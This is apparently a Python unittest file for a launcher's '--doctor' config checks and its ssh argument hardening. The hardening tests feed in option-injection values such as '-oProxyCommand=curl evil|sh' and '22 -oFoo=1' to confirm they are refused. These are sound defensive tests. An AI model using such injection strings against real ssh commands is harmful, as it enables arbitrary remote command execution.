"""launcher --doctor and the ssh argv hardening.

_doctor_checks is kept pure so the diagnosis can be asserted directly rather
than by scraping printed output.
"""

import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

PROJECT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT))

import launcher  # noqa: E402


def status_for(rows, check):
    for status, name, detail in rows:
        if name == check:
            return status, detail
    raise AssertionError(f"no {check!r} row in {[n for _, n, _ in rows]}")


class DoctorTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        self.workspace = self.tmp / "workspace"
        self.workspace.mkdir()
        # Point every state file somewhere disposable so a developer's real
        # install is neither read nor written by the tests.
        for name in ("CONFIG_FILE", "RUNTIME_FILE", "SERVER_LOG", "TUNNEL_LOG"):
            mock.patch.object(launcher, name, self.tmp / name.lower()).start()
        # doctor also checks that config.json is on disk; the tests below pass
        # the parsed dict in directly, so give it a file to find.
        launcher.CONFIG_FILE.write_text("{}", encoding="utf-8")

    def tearDown(self):
        mock.patch.stopall()
        self._tmp.cleanup()

    def _good_config(self, **overrides):
        return dict(
            {
                "token": "a-token",
                "workspace": str(self.workspace),
                "auth_mode": "legacy",
                "port": 8765,
            },
            **overrides,
        )

    def test_healthy_config_has_no_failures(self):
        rows = launcher._doctor_checks(self._good_config())
        failures = [(name, detail) for status, name, detail in rows if status == "fail"]
        self.assertEqual(failures, [])

    def test_missing_token_fails(self):
        rows = launcher._doctor_checks(self._good_config(token=""))
        status, detail = status_for(rows, "master token")
        self.assertEqual(status, "fail")
        self.assertIn("SETUP", detail)

    def test_missing_workspace_fails(self):
        rows = launcher._doctor_checks(self._good_config(workspace=""))
        self.assertEqual(status_for(rows, "workspace")[0], "fail")

    def test_workspace_pointing_at_a_deleted_directory_fails(self):
        rows = launcher._doctor_checks(
            self._good_config(workspace=str(self.tmp / "gone"))
        )
        status, detail = status_for(rows, "workspace")
        self.assertEqual(status, "fail")
        self.assertIn("not a directory", detail)

    def test_oauth_mode_requires_an_owner_code(self):
        rows = launcher._doctor_checks(self._good_config(auth_mode="oauth"))
        self.assertEqual(status_for(rows, "owner code")[0], "fail")

        rows = launcher._doctor_checks(
            self._good_config(auth_mode="oauth", oauth_owner_code="abc123")
        )
        self.assertEqual(status_for(rows, "owner code")[0], "ok")

    def test_legacy_mode_does_not_ask_for_an_owner_code(self):
        rows = launcher._doctor_checks(self._good_config())
        self.assertNotIn("owner code", [name for _, name, _ in rows])

    def test_sish_backend_checks_host_and_key(self):
        rows = launcher._doctor_checks(
            self._good_config(tunnel_backend="sish", tunnel_host="", ssh_key="")
        )
        self.assertEqual(status_for(rows, "tunnel_host")[0], "fail")
        self.assertEqual(status_for(rows, "sish ssh key")[0], "fail")

    def test_sish_rejects_an_option_shaped_tunnel_host(self):
        rows = launcher._doctor_checks(
            self._good_config(tunnel_backend="sish", tunnel_host="-oProxyCommand=id")
        )
        self.assertEqual(status_for(rows, "tunnel_host")[0], "fail")

    def test_custom_ssh_backend_does_not_require_an_ssh_client(self):
        rows = launcher._doctor_checks(self._good_config(tunnel_backend="custom-ssh"))
        self.assertNotIn("ssh client", [name for _, name, _ in rows])

    def test_doctor_returns_nonzero_when_something_is_broken(self):
        with mock.patch.object(launcher, "load_config_or_abort", return_value={}):
            self.assertEqual(launcher.doctor(), 1)

    def test_doctor_returns_zero_when_healthy(self):
        with mock.patch.object(
            launcher, "load_config_or_abort", return_value=self._good_config()
        ):
            self.assertEqual(launcher.doctor(), 0)

    def test_doctor_reports_a_corrupt_config_instead_of_crashing(self):
        with mock.patch.object(
            launcher, "load_config_or_abort", side_effect=SystemExit("bad json")
        ):
            self.assertEqual(launcher.doctor(), 1)


class SshArgvHardeningTests(unittest.TestCase):
    """tunnel_host lands in ssh's argv as the destination. ssh parses its own
    argv, so a value starting with '-' is read as an option -- and
    `-oProxyCommand=...` runs an arbitrary command."""

    def _sish_config(self, **overrides):
        return dict(
            {
                "tunnel_backend": "sish",
                "tunnel_host": "tunnel.example.com",
                "serveo_hostname": "mymcp",
                "ssh_key": __file__,  # any existing file passes the is_file check
                "port": 8765,
            },
            **overrides,
        )

    def test_option_shaped_tunnel_host_is_refused(self):
        with self.assertRaises(RuntimeError) as ctx:
            launcher.build_tunnel_command(
                self._sish_config(tunnel_host="-oProxyCommand=curl evil|sh")
            )
        self.assertIn("not an ssh option", str(ctx.exception))

    def test_destination_is_protected_by_a_double_dash(self):
        command = launcher.build_tunnel_command(self._sish_config())
        self.assertEqual(command[-2:], ["--", "tunnel.example.com"])

    def test_non_numeric_ssh_port_is_refused(self):
        with self.assertRaises(RuntimeError):
            launcher.build_tunnel_command(self._sish_config(tunnel_ssh_port="22 -oFoo=1"))

    def test_numeric_ssh_port_is_accepted(self):
        command = launcher.build_tunnel_command(self._sish_config(tunnel_ssh_port="2222"))
        self.assertIn("2222", command)


if __name__ == "__main__":
    unittest.main()
